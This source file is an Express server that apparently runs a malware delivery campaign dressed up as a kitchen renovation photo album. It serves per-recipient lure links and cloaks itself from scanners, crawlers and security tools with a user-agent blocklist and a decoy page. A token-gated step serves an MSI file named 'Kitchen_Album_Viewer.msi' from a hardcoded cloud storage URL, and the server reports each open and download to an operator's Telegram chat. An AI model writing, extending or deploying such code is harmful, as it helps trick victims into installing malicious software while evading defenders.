// Kitchen renovation album — landing + anti-bot + themed MSI delivery.
// Zero deps beyond express. Node 18+ (uses global fetch).

const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const MSI_URL = process.env.MSI_URL || 'https://aodla.sfo3.digitaloceanspaces.com/audjd.msi';
const MSI_FILENAME = process.env.MSI_FILENAME || 'Kitchen_Album_Viewer.msi';
const ADMIN_KEY = process.env.ADMIN_KEY || '';
const TOKEN_TTL_MS = 15 * 60 * 1000;      // token life
const CHALLENGE_SECRET = process.env.CHALLENGE_SECRET || crypto.randomBytes(32).toString('hex');
const PEPPER = 'reno-album-' + crypto.createHash('sha256').update(CHALLENGE_SECRET).digest('hex').slice(0, 8);

// ---------- Telegram notifications (optional; no-op unless both env vars set) ----------
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const tgOn = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
const openNotified = new Map(); // ip -> last-notify ts (cooldown)

function tgSend(text) {
  if (!tgOn) return;
  try {
    fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true }),
    }).catch(() => {});
  } catch (_) {}
}

function notifyOpen(ip, code) {
  const now = Date.now();
  const last = openNotified.get(ip);
  if (last && now - last < 10 * 60 * 1000) return; // 10-min cooldown per IP
  openNotified.set(ip, now);
  tgSend('Album opened\nIP: <code>' + ip + '</code>\nCode: <code>' + code + '</code>\n' + new Date().toUTCString());
}

function notifyDownload(ip) {
  tgSend('MSI downloaded\nIP: <code>' + ip + '</code>\n' + new Date().toUTCString());
}

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '4kb' }));
app.use(express.static(path.join(__dirname, 'static')));

// ---------- state ----------
const validTokens = new Map();   // token -> { ip, exp }   (issued, not yet used)
const redeemedTokens = new Set(); // tokens already downloaded
const challengeNonces = new Map(); // nonce -> { ip, exp }
const ipChallenges = new Map(); // ip -> { count, reset }
const hits = [];                // { t, ip, ua, path, kind }

function logHit(ip, ua, p, kind) {
  const e = { t: new Date().toISOString(), ip, ua: String(ua || '').slice(0, 160), path: p, kind };
  hits.push(e);
  if (hits.length > 2000) hits.splice(0, hits.length - 2000);
  try { fs.appendFileSync('/tmp/hits.log', JSON.stringify(e) + '\n'); } catch (_) {}
}

setInterval(() => {
  const now = Date.now();
  for (const [k, v] of validTokens) if (v.exp < now) validTokens.delete(k);
  // redeemed tokens are bounded by validTokens; drop the stale ones
  if (redeemedTokens.size > 5000) {
    for (const t of [...redeemedTokens]) if (!validTokens.has(t)) redeemedTokens.delete(t);
  }
  for (const [k, v] of challengeNonces) if (v.exp < now) challengeNonces.delete(k);
  for (const [k, v] of ipChallenges) if (v.reset < now) ipChallenges.delete(k);
}, 60 * 1000).unref();

// ---------- helpers ----------
function clientIp(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
}

function signToken(payload) {
  return crypto.createHmac('sha256', CHALLENGE_SECRET).update(payload).digest('base64url');
}

function makeToken(ip) {
  const body = `${ip}:${Date.now() + TOKEN_TTL_MS}:${crypto.randomBytes(8).toString('base64url')}`;
  const token = `${body}.${signToken(body)}`;
  validTokens.set(token, { ip, exp: parseInt(body.split(':')[1], 10) });
  return token;
}

function verifyToken(token, ip) {
  if (typeof token !== 'string' || redeemedTokens.has(token)) return false;
  const i = token.lastIndexOf('.');
  if (i < 1) return false;
  const body = token.slice(0, i), sig = token.slice(i + 1);
  if (signToken(body) !== sig) return false;
  if (!validTokens.has(token)) return false;           // must have been issued
  const parts = body.split(':');
  if (parts.length !== 3) return false;
  const exp = parseInt(parts[1], 10);
  if (!exp || exp < Date.now()) return false;
  if (parts[0] !== ip) return false;   // token is IP-bound
  return true;
}

const BOT_UA_RE = /bot|crawler|spider|curl|wget|python|go-http|java\/|libwww|headless|phantom|selenium|playwright|puppeteer|scrapy|httpie|okhttp|aiohttp|httpclient|fetch\/|axios|inspector|preview|monitor|archive|slurp|lwp\/|net\.http|requests\/|masscan|nmap|sqlmap|nikto|zgrab|nuclei|wappalyzer|whatweb|openresty|cloudflare|pingdom|uptimerobot|statuscake|datadog|newrelic|semrush|ahrefs|mj12b|dotbot|bytespider|petalbot|applebot|facebookexternalhit|whatsapp|telegrambot|discordbot/i;

function looksLikeBot(req) {
  const ua = String(req.headers['user-agent'] || '');
  if (!ua) return true;
  if (BOT_UA_RE.test(ua)) return true;
  if (ua.includes('Chrome/0.') || ua.includes('Firefox/0.')) return true;
  const accept = String(req.headers['accept'] || '');
  // real browsers send an Accept; most scanners don't
  if (accept && !/text\/html|application\/(xhtml|json)/.test(accept)) return true;
  if (accept === '*/*' && !req.headers['accept-language']) return true;
  // HTTP version: real browsers here are HTTP/1.1 or 2
  if (req.httpVersion && !/^1\.1|^2|^2\.\d|^3/.test(req.httpVersion)) return true;
  return false;
}

// ---------- routes ----------

// Admin: view recent hits + download stats
app.get('/__hits', (req, res) => {
  if (!ADMIN_KEY || req.query.k !== ADMIN_KEY) return res.status(404).send('not found');
  const downloads = hits.filter(h => h.kind === 'download');
  res.json({ total: hits.length, downloads: downloads.length, recent: hits.slice(-200).reverse() });
});

// Root: look like a normal small site root, bounce into the album
app.get('/', (req, res) => {
  logHit(clientIp(req), req.headers['user-agent'], '/', 'root');
  res.redirect(302, '/a/' + crypto.randomBytes(4).toString('hex'));
});

// Decoy for bots / suspicious clients on the album path
function decoy(res, code) {
  res.status(code).type('html').send(fs.readFileSync(path.join(__dirname, 'public', 'decoy.html')));
}

// Album landing page. Any /a/<code> works (per-recipient codes).
app.get(/^\/a\/[A-Za-z0-9_-]{1,64}$/, (req, res) => {
  const ip = clientIp(req);
  logHit(ip, req.headers['user-agent'], req.path, 'album');

  if (looksLikeBot(req)) {
    logHit(ip, req.headers['user-agent'], req.path, 'album-decoy');
    return decoy(res, 200);
  }
  notifyOpen(ip, req.path);

  const nonce = crypto.randomBytes(12).toString('base64url');
  challengeNonces.set(nonce, { ip, exp: Date.now() + TOKEN_TTL_MS });

  const html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'))
    .toString()
    .replace(/__NONCE__/g, nonce)
    .replace(/__PEPPER__/g, PEPPER);
  res.type('html').send(html);
});

// JS challenge solve -> signed one-time token
app.post('/v1/challenge', (req, res) => {
  const ip = clientIp(req);
  const { n, v } = req.body || {};
  if (typeof n !== 'string' || typeof v !== 'string' || n.length < 12 || n.length > 40 || v.length < 8 || v.length > 64) {
    return res.status(400).json({ ok: false });
  }
  const entry = challengeNonces.get(n);
  if (!entry || entry.ip !== ip) return res.status(400).json({ ok: false });
  // v must be the expected hash: djb2 of (nonce + fixed pepper), computed client-side
  const expected = djb2(n + PEPPER);
  if (v !== String(expected)) return res.status(400).json({ ok: false });
  challengeNonces.delete(n);

  // rate limit challenge solves per IP
  const bucket = ipChallenges.get(ip) || { count: 0, reset: Date.now() + 10 * 60 * 1000 };
  bucket.count++;
  ipChallenges.set(ip, bucket);
  if (bucket.count > 25) return res.status(429).json({ ok: false });

  const token = makeToken(ip);
  res.json({ ok: true, token });
});

function djb2(s) {
  let h = 5381;
  for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
  return h;
}

// Download (themed MSI). Only with a fresh, valid, single-use, IP-bound token.
app.get('/d/:token', async (req, res) => {
  const ip = clientIp(req);
  const token = req.params.token;
  logHit(ip, req.headers['user-agent'], req.path.slice(0, 24) + '...', 'download-attempt');

  if (!verifyToken(token, ip)) {
    logHit(ip, req.headers['user-agent'], req.path.slice(0, 24) + '...', 'download-reject');
    return res.status(404).send('not found');
  }
  // single-use: mark redeemed, drop from valid
  validTokens.delete(token);
  redeemedTokens.add(token);

  try {
    const upstream = await fetch(MSI_URL);
    if (!upstream.ok || !upstream.body) throw new Error('upstream ' + upstream.status);
    const total = upstream.headers.get('content-length');
    logHit(ip, req.headers['user-agent'], req.path.slice(0, 24) + '...', 'download');
    notifyDownload(ip);
    res.status(200);
    res.set('Content-Type', 'application/octet-stream');
    res.set('Content-Disposition', 'attachment; filename="' + MSI_FILENAME + '"');
    if (total) res.set('Content-Length', total);
    res.set('Cache-Control', 'no-store');
    const src = (global.Buffer.isBuffer(upstream.body)) ? null : upstream.body;
    if (src) {
      const { Readable } = require('stream');
      Readable.fromWeb(src).pipe(res);
    } else {
      res.end(Buffer.from([]));
    }
  } catch (e) {
    logHit(ip, req.headers['user-agent'], req.path.slice(0, 24) + '...', 'download-error:' + e.message);
    res.status(502).send('the album file server is busy — try again in a minute');
  }
});

// Everything else: quiet 404
app.use((req, res) => {
  res.status(404).type('html').send('<!doctype html><title>Not found</title><body style="background:#141414;color:#9a9a9a;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh"><p>This page doesn\'t exist.</p>');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('album listening on ' + PORT + ' | msi=' + MSI_URL + ' | file=' + MSI_FILENAME);
});
